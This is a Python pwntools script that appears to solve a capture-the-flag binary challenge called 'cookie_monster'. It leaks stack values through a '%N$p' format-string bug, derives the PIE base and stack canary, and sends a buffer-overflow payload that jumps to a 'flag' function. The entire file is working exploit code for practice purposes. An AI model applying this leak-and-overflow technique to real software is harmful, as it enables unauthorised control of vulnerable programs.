from pwn import *
import subprocess

def offset_finder():
    for x in range (1, 100):
        p = process("./cookie_monster")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil('Hello, ')
        # p.recvuntil("Give me a string to echo back.\n")
        stack_value = p.recvline()[:-1]
        # if stack_value.find("00") != -1:
            # print "Canary found!"
            # print "Stack value: {}".format(stack_value)
            # break
        # else:
        print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./cookie_monster")
    # p = remote("ctf.umbccd.io", 4200)
    s = subprocess.Popen(['./leak.py'], shell=True, stdout=subprocess.PIPE).stdout.read()

    binary = ELF("./cookie_monster")
    flag = binary.symbols['flag']

    p.sendline("%7$p")
    p.recvuntil('Hello, ')
    
    leak = p.recvline()[:-1]
    print leak

    base_pie = int(leak, 16) - 0x10d0
    canary_leak = int(open('pie', 'rb').read()[:-8], 16)

    log.info("Canary : {}".format(hex(canary_leak)))
    log.info("Base pie : {}".format(hex(base_pie)))
    log.info("Flag : {}".format(hex(base_pie + flag)))

    payload = ''
    payload += 'A' * 13
    payload += p64(canary_leak)
    payload += 'BBBB'
    payload += p64(base_pie + flag)

    # gdb.attach(p, '''
    #                 pie b *0x00000000000012b7
    #                 c
    #                 ''')

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    # offset_finder()
    exploit()